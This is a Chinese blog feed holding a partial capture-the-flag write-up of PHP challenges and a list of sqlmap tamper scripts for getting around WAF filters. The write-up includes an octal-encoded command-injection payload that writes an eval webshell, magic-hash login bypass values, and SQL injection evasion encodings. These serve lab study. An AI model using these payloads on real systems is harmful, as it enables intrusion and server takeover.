class="string">'/[^0-9\\\]/'</span>,</span><br><span class="line">                <span class="string">''</span>,</span><br><span class="line">                <span class="keyword">isset</span>($_GET[<span class="string">'size'</span>]) ? $_GET[<span class="string">'size'</span>] : <span class="string">'25'</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        system(<span class="string">"/usr/bin/convert $this-&gt;file --resize $e ./thumbs/$this-&gt;file"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;a href=$this-&gt;file&gt; &lt;img src=./thumbs/$this-&gt;file&gt;&lt;/a&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> ImageViewer(<span class="string">"image.png"</span>));</span><br></pre></td></tr></table></figure><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><p>一个生成缩略图的类，<code>system()</code> 或许可以命令注入，<code>__toString()</code> 可能有 <code>xss</code>。</p><p>可惜 <code>file</code> 不可控，那我们仔细看看 <code>size</code> ，这有个特别的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stripcslashes ( string $str ) : string</span><br><span class="line"><span class="comment">// 返回反转义后的字符串。可识别类似 C 语言的 \n，\r，... 八进制以及十六进制的描述。</span></span><br></pre></td></tr></table></figure><p><code>/[^0-9\\\]/</code> 只能有数字、反斜杠和右中括号，上面那函数能识别十六进制，</p><p>但十六进制中包含字母，所以我们可以把字符串转成八进制试试。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(stripcslashes(<span class="string">'\145\143\150\157\40\47\74\77\160\150\160\40\145\166\141\154\50\44\137\107\105\124\133\61\135\51\73\77\76\47\40\76\40\163\150\145\154\154\56\160\150\160'</span>));</span><br><span class="line"><span class="comment">// string(42) "echo '<span class="meta">&lt;?php</span> eval($_GET[1]);<span class="meta">?&gt;</span>' &gt; shell.php"</span></span><br><span class="line"><span class="comment">// 字符串直接转八进制不太好转，可以先转成URL，然后转成十进制，再转八进制</span></span><br></pre></td></tr></table></figure><p>另外，<code>system()</code> 里可以执行多条命令，用 <code>;</code> 分隔一下即可。</p><p>尝试写一个 <code>webshell</code> ，也可以直接反弹一个 <code>shell</code>。</p><p><code>stripcslashes()</code> 这难道不是多次一举，限制只能传入数字不就好了？为了兼容不同进制吗？</p><h3 id="payload-17"><a href="#payload-17" class="headerlink" title="payload"></a>payload</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size=<span class="number">0</span>\<span class="number">073</span>\<span class="number">145</span>\<span class="number">143</span>\<span class="number">150</span>\<span class="number">157</span>\<span class="number">40</span>\<span class="number">47</span>\<span class="number">74</span>\<span class="number">77</span>\<span class="number">160</span>\<span class="number">150</span>\<span class="number">160</span>\<span class="number">40</span>\<span class="number">145</span>\<span class="number">166</span>\<span class="number">141</span>\<span class="number">154</span>\<span class="number">50</span>\<span class="number">44</span>\<span class="number">137</span>\<span class="number">107</span>\<span class="number">105</span>\<span class="number">124</span>\<span class="number">133</span>\<span class="number">61</span>\<span class="number">135</span>\<span class="number">51</span>\<span class="number">73</span>\<span class="number">77</span>\<span class="number">76</span>\<span class="number">47</span>\<span class="number">40</span>\<span class="number">76</span>\<span class="number">40</span>\<span class="number">163</span>\<span class="number">150</span>\<span class="number">145</span>\<span class="number">154</span>\<span class="number">154</span>\<span class="number">56</span>\<span class="number">160</span>\<span class="number">150</span>\<span class="number">160</span>\<span class="number">073</span></span><br></pre></td></tr></table></figure><p>最终执行的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/convert images/image.png --resize 0;echo '&lt;?php eval($_GET[1]);?&gt;' &gt; shell.php;</span><br></pre></td></tr></table></figure><p>写入成功</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1bxcudmt2j20r30fc0u1.jpg" alt></p><h2 id="20-Stocking"><a href="#20-Stocking" class="headerlink" title="20 - Stocking"></a>20 - Stocking</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">set_error_handler(<span class="function"><span class="keyword">function</span> <span class="params">($no, $str, $file, $line)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ErrorException($str, <span class="number">0</span>, $no, $file, $line);</span><br><span class="line">&#125;, E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getResult</span><span class="params">($uri)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!filter_var($uri, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;p&gt;Please enter valid uri&lt;/p&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $image = file_get_contents($uri);</span><br><span class="line">            $path = <span class="string">"./images/"</span> . uniqid() . <span class="string">'.jpg'</span>;</span><br><span class="line">            file_put_contents($path, $image);</span><br><span class="line">            <span class="keyword">if</span> (mime_content_type($path) !== <span class="string">'image/jpeg'</span>) &#123;</span><br><span class="line">                unlink($path);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'&lt;p&gt;Only .jpg files allowed&lt;/p&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;p&gt;There was an error: '</span> .</span><br><span class="line">                $e-&gt;getMessage() . <span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> . $path . <span class="string">'" width="100"/&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> ImageLoader())-&gt;getResult($_GET[<span class="string">'img'</span>]);</span><br></pre></td></tr></table></figure><h3 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h3><p>先看看开头这个设置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set_error_handler ( callable $error_handler [, int $error_types = E_ALL | E_STRICT ] ) : mixed</span><br><span class="line"><span class="comment">// 设置用户的函数 (error_handler) 来处理脚本中出现的错误。</span></span><br><span class="line"><span class="comment">// 本函数可以用你自己定义的方式来处理运行中的错误， 例如，在应用程序中严重错误发生时，或者在特定条件下触发了一个错误(使用 trigger_error())，你需要对数据/文件做清理回收。</span></span><br></pre></td></tr></table></figure><p>这里还特意设置了 <code>E_ALL</code> ，也就是说所有的错误都会显示出来，将错误信息全暴露出来是一个极其不明智的选择，这些报错对正常用户没有任何意义，反而会给攻击者提供更多的信息。</p><p>不仅仅是 SSRF ，肯定有更好玩的，先放一下。</p><h2 id="21-Gift-Wrap"><a href="#21-Gift-Wrap" class="headerlink" title="21 - Gift Wrap"></a>21 - Gift Wrap</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParamExtractor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $validIndices = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">indices</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        $validate = <span class="function"><span class="keyword">function</span> <span class="params">(int $value, $key)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;validIndices[] = $key;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            array_walk($input, $validate, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (TypeError $error) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Only numbers are allowed as input"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;validIndices;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCommand</span><span class="params">($parameters)</span> </span>&#123;</span><br><span class="line">        $indices = <span class="keyword">$this</span>-&gt;indices($parameters);</span><br><span class="line">        $params = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($indices <span class="keyword">as</span> $index) &#123;</span><br><span class="line">            $params[] = $parameters[$index];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> implode($params, <span class="string">' '</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = (<span class="keyword">new</span> ParamExtractor())-&gt;getCommand($_GET[<span class="string">'p'</span>]);</span><br><span class="line">system(<span class="string">'resizeImg image.png '</span> . $cmd);</span><br></pre></td></tr></table></figure><h3 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h3><h2 id="22-Chimney"><a href="#22-Chimney" class="headerlink" title="22 - Chimney"></a>22 - Chimney</h2><blockquote><p>魔法哈希</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">'hash'</span>, md5($_POST[<span class="string">'password'</span>]));</span><br><span class="line">    header(<span class="string">"Refresh: 0"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$password = <span class="string">'0e836584205638841937695747769655'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form&gt;&lt;input type="password" name="password" /&gt;'</span></span><br><span class="line">        . <span class="string">'&lt;input type="submit" value="Login" &gt;&lt;/form &gt;'</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (md5($_COOKIE[<span class="string">'hash'</span>]) == $password) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Login succeeded'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-21"><a href="#分析-21" class="headerlink" title="分析"></a>分析</h3><p>注意这有一个 <code>==</code>，比较时会自动进行类型转换，而给的 <code>password</code> 是 <code>0e</code> 开头</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'0e836584205638841937695747769655'</span>==<span class="string">'0e'</span>);</span><br><span class="line"><span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure><h3 id="payload-18"><a href="#payload-18" class="headerlink" title="payload"></a>payload</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0</span>e830400451993494058<span class="number">024219903391</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0</span>e342768416822451524<span class="number">974117254469</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0</span>e8482404488305379244<span class="number">65865611904</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0</span>e5459932745177090343<span class="number">28855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0</span>e9406242178565615578<span class="number">16327384675</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0</span>e5093672134182067008<span class="number">42008763514</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0</span>e4810364908676611132<span class="number">60034900752</span></span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0</span>e072485820392773389<span class="number">523109082030</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0</span>e731198061491163073<span class="number">197128363787</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0</span>e8615801632915612474<span class="number">04381396064</span></span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0</span>e220463095855511507<span class="number">588041205815</span></span><br></pre></td></tr></table></figure><h2 id="23-Cookies"><a href="#23-Cookies" class="headerlink" title="23 - Cookies"></a>23 - Cookies</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LDAPAuthenticator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $conn;</span><br><span class="line">    <span class="keyword">public</span> $host;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($host = <span class="string">"localhost"</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;host = $host;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        $result = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;conn = ldap_connect(<span class="keyword">$this</span>-&gt;host);</span><br><span class="line">        ldap_set_option(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn,</span><br><span class="line">            LDAP_OPT_PROTOCOL_VERSION,</span><br><span class="line">            <span class="number">3</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (!@ldap_bind(<span class="keyword">$this</span>-&gt;conn))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        $user = ldap_escape($user, <span class="keyword">null</span>, LDAP_ESCAPE_DN);</span><br><span class="line">        $pass = ldap_escape($pass, <span class="keyword">null</span>, LDAP_ESCAPE_DN);</span><br><span class="line">        $result = ldap_search(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn,</span><br><span class="line">            <span class="string">""</span>,</span><br><span class="line">            <span class="string">"(&amp;(uid=$user)(userPassword=$pass))"</span></span><br><span class="line">        );</span><br><span class="line">        $result = ldap_get_entries(<span class="keyword">$this</span>-&gt;conn, $result);</span><br><span class="line">        <span class="keyword">return</span> ($result[<span class="string">"count"</span>] &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"u"</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">"p"</span>])) &#123;</span><br><span class="line">    $ldap = <span class="keyword">new</span> LDAPAuthenticator();</span><br><span class="line">    <span class="keyword">if</span> ($ldap-&gt;authenticate($_GET[<span class="string">"u"</span>], $_GET[<span class="string">"p"</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are now logged in!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Username or password unknown!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-22"><a href="#分析-22" class="headerlink" title="分析"></a>分析</h3><h2 id="24-Nutcracker"><a href="#24-Nutcracker" class="headerlink" title="24 - Nutcracker"></a>24 - Nutcracker</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@$GLOBALS = $GLOBALS&#123;next&#125; </span><br><span class="line">= next($GLOBALS&#123;<span class="string">'GLOBALS'</span>&#125;)[$GLOBALS[<span class="string">'next'</span>][<span class="string">'next'</span>] </span><br><span class="line">= next($GLOBALS)[<span class="string">'GLOBALS'</span>]][$next[<span class="string">'GLOBALS'</span>] </span><br><span class="line">= next($GLOBALS[GLOBALS][<span class="string">'GLOBALS'</span>])[$next[<span class="string">'next'</span>]]][$next[<span class="string">'GLOBALS'</span>] </span><br><span class="line">= next($next[<span class="string">'GLOBALS'</span>])][$GLOBALS[next][<span class="string">'next'</span>]($GLOBALS[<span class="string">'next'</span>]&#123;<span class="string">'GLOBALS'</span>&#125;)] </span><br><span class="line">= next(neXt($&#123;<span class="string">'next'</span>&#125;[<span class="string">'next'</span>]));</span><br></pre></td></tr></table></figure><h3 id="分析-23"><a href="#分析-23" class="headerlink" title="分析"></a>分析</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;有意思一点的优先做了，有时间再更新。&lt;/p&gt;
&lt;h2 id=&quot;1-Wish-List&quot;&gt;&lt;a href=&quot;#1-Wish-List&quot; class=&quot;headerlink&quot; title=&quot;1 - Wish List&quot;&gt;&lt;/a&gt;1 - Wish List&lt;/h2&gt;&lt;blockq
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap tamper 列表</title>
    <link href="https://wywwzjj.top/2019/03/01/SQLMAP-tamper%E5%88%97%E8%A1%A8/"/>
    <id>https://wywwzjj.top/2019/03/01/SQLMAP-tamper列表/</id>
    <published>2019-03-01T15:43:38.000Z</published>
    <updated>2019-05-02T03:17:38.538Z</updated>
    
    <content type="html"><![CDATA[<h2 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h2><blockquote><p>return payload.replace(‘’’, “%EF%BC%87”) if payload else payload</p></blockquote><p>将单引号 url 编码，用于过滤了单引号的情况。</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> 1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a>apostrophenullencode.py</h2><blockquote><p>return payload.replace(‘’’, “%00%27”) if payload else payload</p></blockquote><p>将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> 1�’ AND �’1�’=�’1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py"></a>appendnullbyte.py</h2><blockquote><p>return “%s%%00” % payload if payload else payload</p></blockquote><p>在你构造的payload后面加一个空字符</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> 1’ AND ‘1’=’1[]</p></blockquote><p><strong>适用数据库：</strong>Access</p><h2 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h2><blockquote><p>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</p></blockquote><p>这个看模块名也知道是 base64 编码</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> MScgQU5EICcxJz0nMQ==</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a>between.py</h2><p>这个代码有点长，就不贴代码了，可以自己去查看：</p><p><code>\SQLMap\tamper\between.py</code></p><p>将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p><blockquote><p>1 AND A &gt; B <strong>to</strong> 1 AND A NOT BETWEEN 0 AND B</p><p>1 AND A = B <strong>to</strong> 1 AND A BETWEEN B AND B</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a>bluecoat.py</h2><p>用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p><blockquote><p>union select <em>from users where id = 1 <strong>to</strong> union%09select</em> from%09users where id like 1</p></blockquote><p><strong>适用数据库：</strong>MySQL 5.1, SGOS</p><h2 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h2><p>用 url 编码两次你的 payload</p><blockquote><p>select * from users <strong>to</strong>%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h2><p>用 url 编码一次你的 payload</p><blockquote><p>select * from users <strong>to</strong>%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a>charunicodeencode.py</h2><p>用 unicode 编码 payload ，只编码非编码字符</p><blockquote><p>select * from users <strong>to</strong>u0073u0065u006cu0065u0063u0074u0020u002au0020u0066u0072u006fu006du0020u0075u0073u0065u0072u0073</p></blockquote><p><strong>适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p><h2 id="commalesslimit-py"><a href="#commalesslimit-py" class="headerlink" title="commalesslimit.py"></a>commalesslimit.py</h2><p>将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p><blockquote><p>limit 2,1 <strong>to</strong> limit 1 offset 2</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="commalessmid-py"><a href="#commalessmid-py" class="headerlink" title="commalessmid.py"></a>commalessmid.py</h2><p>将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p><blockquote><p>mid(version(), 1, 1) <strong>to</strong> mid(version() from 1 for 1)</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="commentbeforeparentheses-py"><a href="#commentbeforeparentheses-py" class="headerlink" title="commentbeforeparentheses.py"></a>commentbeforeparentheses.py</h2><blockquote><p>retVal = re.sub(r”b(w+)(“, “g<1>/**/(“, retVal)</1></p></blockquote><p>在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p><blockquote><p>union select group_concat(table_name) <strong>to</strong> union select group_concat/**/(table_name)</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="concat2concatws-py"><a href="#concat2concatws-py" class="headerlink" title="concat2concatws.py"></a>concat2concatws.py</h2><blockquote><p>payload = payload.replace(“CONCAT(“, “CONCAT_WS(MID(CHAR(0),0,0),”)</p></blockquote><p>用于过滤了 concat 函数的情况</p><blockquote><p>concat(1,2) <strong>to</strong> concat_ws(mid(char(0), 0, 0), 1, 2)</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h2><blockquote><p>retVal = re.sub(r”s<em>=s</em>“, “ LIKE “, retVal)</p></blockquote><p>将等号用 like 代替，用于过滤了等号的情况</p><blockquote><p>select <em>from users where id=1 <strong>to</strong> select</em> from users where id like 1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="escapequotes-py"><a href="#escapequotes-py" class="headerlink" title="escapequotes.py"></a>escapequotes.py</h2><blockquote><p>return payload.replace(“‘“, “‘“).replace(‘“‘, ‘“‘)</p></blockquote><p>将单引号转换成 \’ ，双引号转换成 \” ，用于过滤了单引号或双引号的情况</p><blockquote><p>1’ and 1=1–+ <strong>to</strong> 1\’ and 1=1–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="greatest-py"><a href="#greatest-py" class="headerlink" title="greatest.py"></a>greatest.py</h2><p>用 greatest 代替大于符号，用于大于符号被过滤了的情况</p><blockquote><p>1 and a&gt;b <strong>to</strong> 1 and greatest(a,b+1)=a</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h2><p>在关键字前添加注释，用于过滤了关键字的情况</p><blockquote><p>union select 1,2 <strong>to</strong> /<em>!0union/</em>!0select 1,2</p></blockquote><p><strong>适用数据库：</strong>MySQL &lt; 5.1</p><h2 id="htmlencode-py"><a href="#htmlencode-py" class="headerlink" title="htmlencode.py"></a>htmlencode.py</h2><blockquote><p>return re.sub(r”<a href="http://www.myh0st.cn/index.php/archives/881/#fn-1" target="_blank" rel="noopener">1</a>“, lambda match: “&amp;#%d;” % ord(match.group(0)), payload) if payload else payload</p></blockquote><p>从名字就知道是将 payload 进行 html 编码</p><blockquote><p>1’ and 1=1–+ <strong>to</strong> 1’ and 1=1–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a>ifnull2ifisnull.py</h2><p>将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况</p><blockquote><p>ifnull(1, 2) <strong>to</strong> if(isnull(1), 2, 1)</p></blockquote><p><strong>适用数据库：</strong>MySql</p><h2 id="informationschemacomment-py"><a href="#informationschemacomment-py" class="headerlink" title="informationschemacomment.py"></a>informationschemacomment.py</h2><blockquote><p>retVal = re.sub(r”(?i)(information_schema).”, “g<1>/**/.”, payload)</1></p></blockquote><p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p><blockquote><p>select table_name from 